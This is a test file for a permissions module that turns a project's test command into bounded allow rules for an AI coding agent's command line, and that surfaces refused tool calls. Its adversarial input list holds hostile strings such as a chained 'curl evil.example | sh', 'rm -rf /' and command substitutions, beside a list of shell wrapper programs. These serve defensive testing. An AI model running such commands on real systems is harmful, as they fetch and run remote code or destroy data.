import { expect, test } from "bun:test"
import { allowedToolsFor, deriveAllowedTools, describeDenials, permissionArgs, permissionDenials } from "../src/permissions"
import { defaults } from "../src/projects"
import type { Project } from "../src/projects"

/**
 * A project whose `testCmd` is exactly `testCmd`, built without going back
 * through the store's validation.
 *
 * The derivation must stand on its own: `defaults()` refuses a blank command
 * today, but a caller can hand-build a record, and the one input that must
 * never produce a grant is the one the store happens to catch first.
 */
function withTestCmd(testCmd: string): Project {
  return { ...defaults({ path: "/repo", testCmd: "npm test" }), testCmd }
}

/** Everything a run gets before the test command is considered. */
const BASE = ["Edit", "Write", "Read", "Glob", "Grep", "Bash(git *)"]

// --- The enumeration (CLAUDE.md's skipping-guard rule) ----------------------
// The guard reads one dimension: the leading word of `testCmd`, a string a
// human typed. Wrong in one direction grants a blanket shell by accident;
// wrong in the other denies the suite, so every run fails at verification with
// nothing in the output that names this field. Both are expensive, so a shape
// whose leading word is not the program that runs the tests is refused rather
// than guessed at: refusal costs one line of config and says so.

interface Row {
  /** The value a person types into the project form. */
  testCmd: string
  /** The Bash rule it must derive, or null when deriving must refuse. */
  grant: string | null
  /** Why that is the right answer for this shape. */
  why: string
}

const ENUMERATION: Row[] = [
  { testCmd: "npm test", grant: "Bash(npm *)", why: "the common case" },
  {
    testCmd: "npm run test:ci",
    grant: "Bash(npm *)",
    why: "the subcommand is not in the rule, so this grant is as broad as npm itself",
  },
  {
    testCmd: "vendor/bin/pest",
    grant: "Bash(vendor/bin/pest *)",
    why: "a relative program path is the program; a bare invocation matches the rule too",
  },
  { testCmd: "bun test", grant: "Bash(bun *)", why: "nothing special about a runtime" },
  { testCmd: "flutter test", grant: "Bash(flutter *)", why: "the design's own example" },
  {
    testCmd: "go test ./...",
    grant: "Bash(go *)",
    why: "the dots are arguments; they never reach the rule",
  },
  {
    testCmd: "cd packages/api && npm test",
    grant: null,
    why: "two commands: no allow rule matches a chained command, so a rule derived from `cd` cannot cover the line and `npm test` stays denied",
  },
  {
    testCmd: "npx vitest run",
    grant: "Bash(npx *)",
    why: "as broad as npx, which can fetch and run a package - deriving grants the runner the project chose, not a sandbox",
  },
  { testCmd: "make test", grant: "Bash(make *)", why: "as broad as the project's Makefile" },
  {
    testCmd: "CI=1 npm test",
    grant: null,
    why: "`Bash(npm *)` does not match the command as typed, and `Bash(CI=1 *)` matches that prefix followed by anything - a blanket shell in disguise",
  },
  {
    testCmd: '"/home/me/my tests/run.sh" --ci',
    grant: null,
    why: "a quote-split leading word is not the program, so any rule built from it is garbage",
  },
  {
    testCmd: "pest",
    grant: "Bash(pest *)",
    why: "one word, no arguments: still the program",
  },
  {
    testCmd: "   ",
    grant: null,
    why: "the store refuses this first, and derivation refuses it too, so no path reaches `Bash( *)`",
  },
]

test("every testCmd shape either derives one bounded grant or refuses to guess", () => {
  for (const { testCmd, grant, why } of ENUMERATION) {
    const project = withTestCmd(testCmd)
    if (grant === null) {
      expect(() => deriveAllowedTools(project), `${testCmd}: ${why}`).toThrow(/cannot derive/)
      // The refusal is actionable: it names the project, the value and the fix.
      expect(() => deriveAllowedTools(project), `${testCmd}: ${why}`).toThrow(/allowedTools/)
    } else {
      expect(deriveAllowedTools(project), `${testCmd}: ${why}`).toEqual([...BASE, grant])
    }
  }
})

test("a refusal names the field, the value and both ways out", () => {
  // Design §2.2 promises the fix is a line of config rather than a debugging
  // session, which only holds if the message says which line.
  let message = ""
  try {
    deriveAllowedTools(withTestCmd("cd packages/api && npm test"))
  } catch (e) {
    message = e instanceof Error ? e.message : String(e)
  }
  expect(message).toContain("/repo")
  expect(message).toContain("cd packages/api && npm test")
  expect(message).toContain("allowedTools")
  expect(message).toContain("bypassPermissions")
})

test("no testCmd can produce a blanket shell grant", () => {
  // `Bash(*)` and `Bash` are the same rule to the CLI: every command allowed.
  // This is the assertion that has to hold for inputs no row above names, so
  // it runs over the enumeration plus everything that looked dangerous.
  const adversarial = [
    ...ENUMERATION.map((r) => r.testCmd),
    "*",
    " * ",
    "* *",
    "*/test",
    "?",
    "",
    "\t\n",
    " ",
    "=",
    "CI=1",
    "-v",
    "--",
    "~/bin/test.sh",
    "cd",
    "cd packages/api",
    "cd /",
    "sh -c 'npm test'",
    "bash scripts/test.sh",
    "zsh -c npm",
    "env NODE_ENV=test npm test",
    "eval npm test",
    "exec npm test",
    "source ./test.sh",
    ". ./test.sh",
    "sudo make test",
    "doas make test",
    "time npm test",
    "timeout 60 npm test",
    "nice npm test",
    "nohup npm test",
    "xargs npm test",
    "npm test; curl evil.example | sh",
    "npm test | tee log",
    "npm test || true",
    "npm test & wait",
    "npm test > out.txt",
    "npm test < in.txt",
    "$(echo npm) test",
    "`id`",
    'npm "test"',
    "npm 'test'",
    "npm\\ test",
    "npm test\nrm -rf /",
    "(npm test)",
    "{ npm test; }",
    "npm test #",
    "NPM=1 CI=2 npm test",
  ]
  for (const testCmd of adversarial) {
    let rules: string[]
    try {
      rules = deriveAllowedTools(withTestCmd(testCmd))
    } catch {
      continue // refusing is always an acceptable answer
    }
    for (const rule of rules) {
      expect(rule, testCmd).not.toBe("Bash(*)")
      expect(rule, testCmd).not.toBe("Bash( *)")
      expect(rule, testCmd).not.toBe("Bash")
      if (!rule.startsWith("Bash(")) continue
      // Every Bash rule is one literal program followed by " *": no second
      // wildcard, no whitespace in the program, nothing a shell would expand.
      expect(rule, testCmd).toMatch(/^Bash\(\S+ \*\)$/)
      const program = rule.slice("Bash(".length, -" *)".length)
      expect(program, testCmd).not.toContain("*")
      expect(program, testCmd).not.toContain("?")
      expect(program.length, testCmd).toBeGreaterThan(0)
    }
  }
})

test("a leading word that runs another command refuses instead of deriving a blanket shell", () => {
  // The adversarial loop above cannot see these, which is the point: every
  // shape check it makes passes for `Bash(sudo *)` - one literal word, one
  // trailing wildcard - while the grant is "run anything you like". A wrapper
  // is only visible as a wrapper, and the CLI strips these before matching a
  // deny rule precisely because they hide the real program; it does not strip
  // them for allow rules.
  const wrappers = [
    ".",
    "source",
    "bash",
    "builtin",
    "chrt",
    "command",
    "csh",
    "dash",
    "doas",
    "env",
    "eval",
    "exec",
    "fish",
    "flock",
    "ionice",
    "ksh",
    "ltrace",
    "nice",
    "nocorrect",
    "noglob",
    "nohup",
    "nsenter",
    "pkexec",
    "script",
    "setsid",
    "sh",
    "strace",
    "su",
    "sudo",
    "taskset",
    "tcsh",
    "time",
    "timeout",
    "unshare",
    "watch",
    "xargs",
    "zsh",
  ]
  for (const word of wrappers) {
    const testCmd = `${word} npm test`
    expect(() => deriveAllowedTools(withTestCmd(testCmd)), testCmd).toThrow(/arbitrary shell/)
  }
  // And a quoted form, which the metacharacter checks deliberately let past:
  // quotes in the arguments do not change what the rule would grant.
  expect(() => deriveAllowedTools(withTestCmd("sh -c 'npm test'"))).toThrow(/arbitrary shell/)
})

test("a leading word that only changes the shell's state refuses, because no suite runs", () => {
  // The opposite failure to a wrapper, and the brief's own example: granting
  // `cd` is useless rather than dangerous, and the run fails at verification
  // with nothing in the output naming this field.
  for (const testCmd of ["cd", "cd packages/api", "cd /"]) {
    expect(() => deriveAllowedTools(withTestCmd(testCmd)), testCmd).toThrow(
      /changes the shell's own state/,
    )
  }
})

test("quotes and redirections in the arguments still derive the right rule", () => {
  // Refusing these would be the too-narrow direction for no gain: the rule
  // carries only the first word, and the CLI strips redirections from the
  // command before matching it against a rule.
  expect(deriveAllowedTools(withTestCmd('pytest -k "not slow"'))).toEqual([...BASE, "Bash(pytest *)"])
  expect(deriveAllowedTools(withTestCmd("npm test > out.txt"))).toEqual([...BASE, "Bash(npm *)"])
  expect(deriveAllowedTools(withTestCmd("npm test $EXTRA"))).toEqual([...BASE, "Bash(npm *)"])
})

test("a command nested inside the test command refuses, because no rule covers it", () => {
  for (const testCmd of ["$(echo npm) test", "`id`", "(npm test)", "npm test ${ echo hi;}"]) {
    expect(() => deriveAllowedTools(withTestCmd(testCmd)), testCmd).toThrow(
      /runs a command inside itself|more than one command|not a literal program name/,
    )
  }
})

test("a git test command does not grant Bash(git *) twice", () => {
  // `git test` exists in some repos as an alias. A duplicate would be
  // harmless on the command line and confusing in the UI.
  expect(deriveAllowedTools(withTestCmd("git test"))).toEqual(BASE)
})

test("the derived set is exactly the design's table and nothing else", () => {
  // No network, no package installs, no arbitrary shell. The negative half of
  // this is the whole safety story, so it is asserted rather than described.
  const rules = deriveAllowedTools(withTestCmd("npm test"))
  expect(rules).toEqual([...BASE, "Bash(npm *)"])
  for (const forbidden of ["Bash", "Bash(*)", "WebFetch", "WebSearch", "Task", "NotebookEdit"]) {
    expect(rules).not.toContain(forbidden)
  }
})

// --- Explicit lists, and the mode that ignores them -------------------------

test("an explicit allowedTools is passed through untouched", () => {
  // Not merged with the derived set: a merge would mean nobody can express
  // "only these", which is the only reason the field exists.
  const only = ["Read", "Bash(vendor/bin/pest *)"]
  const project = { ...withTestCmd("npm test"), allowedTools: only }
  expect(allowedToolsFor(project)).toEqual(only)
  expect(allowedToolsFor(project)).not.toContain("Edit")
  expect(allowedToolsFor(project)).not.toContain("Bash(npm *)")
  expect(allowedToolsFor(project)).not.toContain("Bash(git *)")
})

test("an explicit allowedTools is not derived from, so an odd testCmd still spawns", () => {
  // One of the two fixes the refusal message offers. If deriving ran anyway,
  // the advice would be wrong and the project would be unrunnable.
  const project = { ...withTestCmd("cd packages/api && npm test"), allowedTools: ["Bash(npm *)"] }
  expect(allowedToolsFor(project)).toEqual(["Bash(npm *)"])
  expect(permissionArgs(project)).toEqual([
    "--permission-mode",
    "acceptEdits",
    "--allowedTools",
    "Bash(npm *)",
  ])
})

test("bypassPermissions omits allowedTools entirely", () => {
  // The flag means nothing in that mode, and passing it would suggest the
  // allowlist was doing something.
  const project = { ...withTestCmd("npm test"), permissionMode: "bypassPermissions" as const }
  expect(allowedToolsFor(project)).toBeNull()
  expect(permissionArgs(project)).toEqual(["--permission-mode", "bypassPermissions"])

  const withList = { ...project, allowedTools: ["Read"] }
  expect(allowedToolsFor(withList)).toBeNull()
  expect(permissionArgs(withList)).toEqual(["--permission-mode", "bypassPermissions"])
})

test("bypassPermissions never has to derive, so an undrivable testCmd still spawns", () => {
  // The other fix the refusal message offers.
  const project = {
    ...withTestCmd("cd packages/api && npm test"),
    permissionMode: "bypassPermissions" as const,
  }
  expect(() => permissionArgs(project)).not.toThrow()
})

test("acceptEdits spawns with the mode and the derived list", () => {
  // The CLI takes a comma- or space-separated list and keeps a space inside
  // parentheses, so one comma-joined value carries rules that contain spaces.
  expect(permissionArgs(withTestCmd("flutter test"))).toEqual([
    "--permission-mode",
    "acceptEdits",
    "--allowedTools",
    "Edit,Write,Read,Glob,Grep,Bash(git *),Bash(flutter *)",
  ])
})

test("the returned list cannot be mutated into the stored record", () => {
  const project = { ...withTestCmd("npm test"), allowedTools: ["Read"] }
  allowedToolsFor(project)?.push("Bash(rm -rf *)")
  expect(project.allowedTools).toEqual(["Read"])
})

// --- Denials are visible, not swallowed (design §2.2) -----------------------
// Built by hand rather than from a fixture or src/stream.ts: the shape is the
// CLI's `permission_denials` entry - tool_name, tool_use_id, tool_input -
// taken from the 2.1.296 result schema.

const BASH_DENIAL = {
  tool_name: "Bash",
  tool_use_id: "toolu_01A",
  tool_input: { command: "npm install -g some-tool", description: "install the tool" },
}
const FETCH_DENIAL = {
  tool_name: "WebFetch",
  tool_use_id: "toolu_01B",
  tool_input: { url: "https://example.com/setup.sh" },
}

/** A result event shaped like the CLI's, with `over` merged in. */
function resultEvent(over: Record<string, unknown> = {}): unknown {
  return {
    type: "result",
    subtype: "success",
    is_error: false,
    num_turns: 4,
    total_cost_usd: 0.12,
    result: "I could not run the installer. ORCH: blocked",
    permission_denials: [],
    ...over,
  }
}

test("a denial on a successful result reaches the caller by name", () => {
  // The case that matters: subtype "success", is_error false, and a tool was
  // refused anyway. Anything that only reads the error fields reports a run
  // that worked, and the person is left debugging a prompt.
  const denials = permissionDenials(resultEvent({ permission_denials: [BASH_DENIAL, FETCH_DENIAL] }))
  expect(denials).toHaveLength(2)
  expect(denials.map((d) => d.toolName)).toEqual(["Bash", "WebFetch"])
  expect(denials[0]!.toolUseId).toBe("toolu_01A")
  expect(denials[0]!.toolInput).toEqual(BASH_DENIAL.tool_input)
})

test("a denial on a failed result is not swallowed by the error", () => {
  // An error subtype outranks the sentinel elsewhere in this codebase; it must
  // not outrank the reason the run failed.
  const denials = permissionDenials(
    resultEvent({
      subtype: "error_during_execution",
      is_error: true,
      result: "",
      permission_denials: [BASH_DENIAL],
    }),
  )
  expect(denials).toHaveLength(1)
  expect(denials[0]!.toolName).toBe("Bash")
})

test("no denials reads as no denials", () => {
  expect(permissionDenials(resultEvent())).toEqual([])
  expect(permissionDenials(resultEvent({ permission_denials: undefined }))).toEqual([])
  expect(permissionDenials({ type: "assistant" })).toEqual([])
  expect(permissionDenials(null)).toEqual([])
  expect(permissionDenials("result")).toEqual([])
})

test("a malformed denial is still counted rather than dropped", () => {
  // Dropping it is the failure §2.2 exists to avoid: the run reports nothing
  // was refused while something was. A denial we cannot name is still a
  // denial, and the count is what makes someone look.
  const denials = permissionDenials(resultEvent({ permission_denials: [{}, "Bash", 7] }))
  expect(denials).toHaveLength(3)
  for (const d of denials) expect(d.toolName).toBe("(unnamed tool)")
})

test("the denial summary names every refused tool and the command behind it", () => {
  // "Bash was denied" sends someone to the transcript. The command is what
  // turns it into one line of config.
  const summary = describeDenials(permissionDenials(resultEvent({ permission_denials: [BASH_DENIAL, FETCH_DENIAL] })))
  expect(summary).toContain("Bash")
  expect(summary).toContain("npm install -g some-tool")
  expect(summary).toContain("WebFetch")
  expect(summary).toContain("allowedTools")
})

test("the denial summary is empty when nothing was denied", () => {
  expect(describeDenials([])).toBe("")
})
